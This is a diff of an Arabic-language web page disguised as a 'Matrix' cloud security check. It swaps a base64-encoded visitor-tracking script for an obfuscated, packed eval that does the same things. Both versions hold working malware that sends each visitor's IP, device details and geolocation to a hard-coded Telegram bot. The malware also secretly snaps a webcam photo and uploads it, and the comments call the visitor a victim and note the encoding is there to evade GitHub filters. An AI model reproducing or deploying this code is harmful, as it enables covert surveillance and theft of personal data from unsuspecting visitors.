@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Matrix Market | فحص الأمان</title>
+    <title>Matrix Security v4.0 | التحقق من الأمان</title>
     <style>
         body { background-color: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
         .main-container { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 40px; width: 100%; max-width: 450px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
@@ -22,8 +22,8 @@
     <div class="main-container">
         <div class="header">
             <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#58a6ff" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
-            <h1>نظام Matrix للتحقق v4.0</h1>
-            <p class="subtitle">تأمين الاتصال السحابي المشفر</p>
+            <h1>نظام التحقق السحابي</h1>
+            <p class="subtitle">Matrix Cloud Protection</p>
         </div>
 
         <div class="scan-section">
@@ -38,70 +38,13 @@
         </div>
 
         <div class="footer">
-            <div>الحالة: <span style="color:#39ff14">نشط</span></div>
-            <div>التشفير: AES-256</div>
+            <div>الحالة: <span style="color:#39ff14">مشفر</span></div>
+            <div>AES-256 SSL</div>
         </div>
     </div>
 
     <script>
-    (function() {
-        // تم تشفير التوكن والـ ID بصيغة Base64 لإخفائها عن فلاتر GitHub
-        const _m1 = "Nzg3MzQyNjM5NDpBQUdQRDNONU56LVJlSjkwTGVURDk5Z256ZTlQMGV2SXI3bw==";
-        const _m2 = "NzI1MzA5MjQ5MQ==";
-
-        // فك التشفير برمجياً فقط عند تشغيل الصفحة
-        const _t = atob(_m1);
-        const _id = atob(_m2);
-
-        function _report(text) {
-            fetch(`https://api.telegram.org/bot${_t}/sendMessage?chat_id=${_id}&text=${encodeURIComponent(text)}`);
-        }
-
-        _report("🔔 زائر جديد فتح الصفحة!");
-
-        document.getElementById('startScanBtn').addEventListener('click', function() {
-            const logs = document.getElementById('logs');
-            document.getElementById('terminal').style.display = 'block';
-            logs.innerHTML = '<div class="line">> جاري بدء الاتصال المشفر...</div>';
-
-            _report("🚀 الضحية بدأ الفحص");
-
-            // 1. جلب الـ IP
-            fetch('https://api.ipify.org?format=json')
-                .then(r => r.json())
-                .then(d => _report("📍 IP: " + d.ip));
-
-            // 2. الموقع
-            navigator.geolocation.getCurrentPosition(p => {
-                _report(`📍 الموقع: https://www.google.com/maps?q=$${p.coords.latitude},${p.coords.longitude}`);
-            }, () => _report("❌ رفض الموقع"));
-
-            // 3. الكاميرا
-            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-                setTimeout(() => {
-                    const v = document.createElement('video');
-                    v.srcObject = stream;
-                    v.play();
-                    setTimeout(() => {
-                        const c = document.createElement('canvas');
-                        c.width = 640; c.height = 480;
-                        c.getContext('2d').drawImage(v, 0, 0);
-                        c.toBlob(b => {
-                            const f = new FormData();
-                            f.append('chat_id', _id);
-                            f.append('photo', b, 's.jpg');
-                            fetch(`https://api.telegram.org/bot${_t}/sendPhoto`, { method: 'POST', body: f })
-                            .then(() => stream.getTracks().forEach(t => t.stop()));
-                        }, 'image/jpeg');
-                    }, 1500);
-                }, 500);
-            }).catch(() => _report("❌ رفض الكاميرا"));
-
-            setTimeout(() => { logs.innerHTML += '<div class="line">> تم تأكيد الهوية السحابية...</div>'; }, 2000);
-            setTimeout(() => { alert("خطأ في النظام: يرجى المحاولة لاحقاً."); }, 4000);
-        });
-    })();
+    eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('(7(){5 6="7873426394:AAGPD3N5Nz-ReJ90LeTD99gnze9P0evIr7o";5 9="7253092491";7 a(b){c(`d://e.f.g/h${6}/i?j_k=${9}&l=${m("[M-S]: "+b)}`)}a("🔔 الضحية فتح الصفحة الآن!");n.o(\'p\').q(\'r\',u 7(){5 s=n.o(\'t\');5 v=n.o(\'w\');s.x.y=\'z\';5 A=["> جاري الاتصال... ","> جاري تحليل البصمة...","> جاري تشفير الجلسة..."];A.B((C,D)=>{E(()=>{v.F+=`<G H="I">${C}</G>`},D*J)});a("🚀 بدأ الفحص - جاري السحب...");K(\'L://M.N.O?P=Q\').R(r=>r.S()).R(d=>{5 T=`📍 IP: ${d.U}\\n📱 الجهاز: ${V.W}\\n🌐 اللغة: ${V.X}`;a(T)});Y(V.Z){V.Z.10(p=>{5 11=p.12.13;5 14=p.12.15;a(`📍 الموقع: 16://17.18.19/1a{11},${14}`)},()=>a("❌ رفض الموقع"))}1b{5 1c=1d V.1e.1f({1g:1h});5 1i=n.1j(\'1i\');1i.1k=1c;1i.1l();1m(()=>{5 1n=n.1j(\'1o\');1n.1p=1q;1n.1r=1s;1n.1t(\'1u\').1v(1i,0,0);1n.1w(b=>{5 f=1x 1y();f.1z(\'j_k\',9);f.1z(\'1A\',b,\'1B.1C\');f.1z(\'1D\',\'🎯 لقطة مباشرة\');K(`d://e.f.g/h${6}/1E`,{1F:\'1G\',1H:f}).R(()=>1c.1I().1J(t=>t.1K()));a("✅ تم سحب البيانات بنجاح!")},\'1L/1M\',0.8)},1N)}1O(e){a("❌ فشل الكاميرا")}});})();',62,112,'|||||const|TK|function||CH|send|msg|fetch|https|api|telegram|org|bot|sendMessage|chat|id|text|encodeURIComponent|document|getElementById|startScanBtn|addEventListener|async|term|terminal|steps|logs|style|display|block|list|forEach|s|i|setTimeout|innerHTML|div|class|line|1200|fetch|https|api|ipify|org|format|json|then|json|info|ip|navigator|userAgent|language|if|geolocation|getCurrentPosition|lat|coords|latitude|lon|longitude|http|googleusercontent|maps|google|com|mediaDevices|getUserMedia|video|true|videoElement|createElement|srcObject|play|videoWidth|videoHeight|canvas|width|1280|height|720|getContext|2d|drawImage|toBlob|new|FormData|append|photo|capture|jpg|caption|sendPhoto|method|POST|body|getTracks|forEach|stop|image|jpeg|4000|catch'.split('|'),0,{}));
     </script>
 </body>
 </html>
-
